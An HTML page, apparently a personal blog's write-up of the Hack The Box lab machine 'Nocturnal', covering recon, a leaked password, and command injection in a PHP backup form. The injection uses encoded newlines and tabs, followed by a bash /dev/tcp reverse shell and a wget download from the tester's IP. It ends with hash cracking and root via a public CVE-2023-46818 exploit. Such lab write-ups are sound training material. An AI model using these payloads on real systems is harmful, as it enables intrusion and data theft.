@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Nocturnal - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Nocturnal</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1745439544123"
+                  >2025-04-23 22:19</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1745841554610"
+                  >2025-04-28 13:59</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/dfd4d3b5f31041fb8cef57324585c94c.png" /></p>
+<p><img src="/_resources/6a66f1a0edc848b89d92924d124fd06d.png" /></p>
+<p><img src="/_resources/a92dc18832604f3ca88d31a67d887701.png" /></p>
+<p>Using dirbuster we can find admin.php</p>
+<p><img src="/_resources/d427c003615a46eabea475ea7ede1e44.png" /></p>
+<p>We can create an account, see that <code>admin</code> username is already taken. Then we get redirected to dashboard.php which allows us to upload files.</p>
+<p><img src="/_resources/71137748c31c492eb3d3994f6b4b648c.png" /></p>
+<h1 id="file-transfers">file transfers</h1>
+<p>If we try to upload a picture, we get the following error.</p>
+<p><img src="/_resources/465334dd4343444380828b80be31d43d.png" /></p>
+<p>Afer adding a pdf, we can see that it is accessible to us on site.</p>
+<p><img src="/_resources/68ede76909c64c5a8c5d9adfa68be8b4.png" /></p>
+<p>We can then download the file from the following link: <code>http://nocturnal.htb/view.php?username=admin1&amp;file=file.pdf</code>. If we try to get a simple file path traversal, then we get another error.</p>
+<p><img src="/_resources/d99a3743ccb647b1afa12ed1c9333cf0.png" /></p>
+<p>We can check also, that <code>http://nocturnal.htb/view.php?username=admin1&amp;file=.pdf</code> will give us a page for any user, but will error out.</p>
+<p><img src="/_resources/ea915f2dbdc64a2c8da9ae33dd24c930.png" /></p>
+<p>We can then bruteforce usernames using ffuf or burpsuite intruder (only in pro version, demo too slow).</p>
+<p><img src="/_resources/3ad656ebb1864b29baa5bb888b0b9a61.png" /></p>
+<p><img src="/_resources/3e98360145954264b8ef0374e5016f3a.png" /></p>
+<p>We can then find <code>privacy.odt</code>.</p>
+<p><img src="/_resources/8c7182db2d6744e8822267ed6ab4552b.png" /></p>
+<p>From it we get <code>amanda:arHkG7HAI68X8s1J</code>.</p>
+<p><img src="/_resources/dc960b7fc2264c088648526d6c4a437a.png" /></p>
+<p>We can then login as amanda, who has admin options.</p>
+<h1 id="admin-panel">admin panel</h1>
+<p><img src="/_resources/d8dc91b893184c06b444dcea59446a22.png" /></p>
+<p><img src="/_resources/2b415b6c64f4411cace02b0b3df25ade.png" /></p>
+<p>I tried once again doing a path traversal, to make backup of whole system, but to no avail. We have access to the code of the admin panel and we can see how our new backup option works.</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanEntry</span>(<span class="hljs-params"><span class="hljs-variable">$entry</span></span>) </span>{
+    <span class="hljs-variable">$blacklist_chars</span> = [<span class="hljs-string">';'</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">'|'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'{'</span>, <span class="hljs-string">'}'</span>, <span class="hljs-string">'&amp;&amp;'</span>];
+
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) {
+        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$entry</span>, <span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>) {
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// Malicious input detected</span>
+        }
+    }
+
+    <span class="hljs-keyword">return</span> htmlspecialchars(<span class="hljs-variable">$entry</span>, ENT_QUOTES, <span class="hljs-string">'UTF-8'</span>);
+}
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'backup'</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])) {
+    <span class="hljs-variable">$password</span> = cleanEntry(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);
+    <span class="hljs-variable">$backupFile</span> = <span class="hljs-string">"backups/backup_"</span> . date(<span class="hljs-string">'Y-m-d'</span>) . <span class="hljs-string">".zip"</span>;
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$password</span> === <span class="hljs-literal">false</span>) {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div class='error-message'&gt;Error: Try another password.&lt;/div&gt;"</span>;
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-variable">$logFile</span> = <span class="hljs-string">'/tmp/backup_'</span> . uniqid() . <span class="hljs-string">'.log'</span>;
+       
+        <span class="hljs-variable">$command</span> = <span class="hljs-string">"zip -x './backups/*' -r -P "</span> . <span class="hljs-variable">$password</span> . <span class="hljs-string">" "</span> . <span class="hljs-variable">$backupFile</span> . <span class="hljs-string">" .  &gt; "</span> . <span class="hljs-variable">$logFile</span> . <span class="hljs-string">" 2&gt;&amp;1 &amp;"</span>;
+        
+        <span class="hljs-variable">$descriptor_spec</span> = [
+            <span class="hljs-number">0</span> =&gt; [<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>], <span class="hljs-comment">// stdin</span>
+            <span class="hljs-number">1</span> =&gt; [<span class="hljs-string">"file"</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">"w"</span>], <span class="hljs-comment">// stdout</span>
+            <span class="hljs-number">2</span> =&gt; [<span class="hljs-string">"file"</span>, <span class="hljs-variable">$logFile</span>, <span class="hljs-string">"w"</span>], <span class="hljs-comment">// stderr</span>
+        ];
+
+        <span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$descriptor_spec</span>, <span class="hljs-variable">$pipes</span>);
+        <span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) {
+            proc_close(<span class="hljs-variable">$process</span>);
+        }
+
+        sleep(<span class="hljs-number">2</span>);
+
+        <span class="hljs-variable">$logContents</span> = file_get_contents(<span class="hljs-variable">$logFile</span>);
+        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$logContents</span>, <span class="hljs-string">'zip error'</span>) === <span class="hljs-literal">false</span>) {
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div class='backup-success'&gt;"</span>;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Backup created successfully.&lt;/p&gt;"</span>;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a href='"</span> . htmlspecialchars(<span class="hljs-variable">$backupFile</span>) . <span class="hljs-string">"' class='download-button' download&gt;Download Backup&lt;/a&gt;"</span>;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;"</span> . htmlspecialchars(<span class="hljs-variable">$logContents</span>) . <span class="hljs-string">"&lt;/pre&gt;"</span>;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/div&gt;"</span>;
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div class='error-message'&gt;Error creating the backup.&lt;/div&gt;"</span>;
+        }
+
+        unlink(<span class="hljs-variable">$logFile</span>);
+    }
+}</code></pre></div>
+<p>In this code we can check what characters are filtered out. We can bypass mechanism, by adding a newline in percent-encoding (<code>%0A</code>, adding bash command and then another newline to execute it. We cannot use spaces, so we can use tabs encoded as <code>%09</code>. First we can test it out with <code>%0Abash%09-c%09"id"%0A</code> to see if it works at all. Then I tried <code>%0Abash%09-c%09"nc%09-e%09%2fbin%2fbash%0910.10.16.56%091234"%0A</code>, but this version of netcat doesnt have <code>-e</code> flag.</p>
+<p><img src="/_resources/e353bf19986d4b57a0b295e4632b6ac4.png" /></p>
+<p>We can then create a file with a script and execute it to get a reverse shell.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.16.56/4444 0&gt;&amp;1</code></pre></div>
+<p>To download then we input as password <code>%0Abash%09-c%09"wget%09http://10.10.16.56/shell.sh"%0A</code>. Then we can run it using <code>%0Abash%%09"ls%09-laR"%0A</code>, <code>%0Abash%09"chmod%09777%09./shell.sh"%0A</code>, <code>%0Abash%%09"./shell.sh"%0A</code>.</p>
+<p>We get then a reverse shell and in <code>/var/www/nocturnal_database</code> we can find a <code>nocturnal_database.db</code> file. We can send it over or just cat it.</p>
+<p><img src="/_resources/d151a61d63d64158af2acafd15806bc4.png" /></p>
+<p>Tobias has hash <code>55c82b1ccd55ab219b3b109b07d5061d</code> which get’s cracked by <code>crackstation.net</code> and corresponds to <code>slowmotionapocalypse</code>. So the creds are <code>tobias@nocturnal.htb:slowmotionapocalypse</code></p>
+<h1 id="priv-esc">priv esc</h1>
+<p><img src="/_resources/bacfe3a59dac473a9da477ef70d2b76c.png" /></p>
+<p><code>sudo ssh -L 8080:127.0.0.1:8080 -L 33061:127.0.0.1:3306 -L 33060:localhost:33060 tobias@nocturnal.htb</code></p>
+<p>Om port 8080 there is internal service called ISPconfig.</p>
+<p><img src="/_resources/ddd28ee76f3f450c8a418b79ece01b62.png" /></p>
+<p>On port 3306 there is mysql.</p>
+<p><img src="/_resources/4dba7345234e4f49a4eb548c789c774c.png" /></p>
+<p>I was stumbling for a while and then remembered it’s “easy” so reused password for tobias with username admin and got into ISPconfig, <code>admin:slowmotionapocalypse</code>.</p>
+<p><img src="/_resources/804b60c380954d59a7b7040f67625f12.png" /></p>
+<p>Once we have that, we can find CVE-2023-46818 with a nice <a title="https://github.com/bipbopbup/CVE-2023-46818-python-exploit" href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit">POC on github</a>.</p>
+<p><img src="/_resources/766f29ccf56e437baf6928fc9f394891.png" /></p>
+<p>The user is running as root, so that’s it.</p>
+<p><img src="/_resources/07a9256d5ebf4336abffb036c18631a2.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
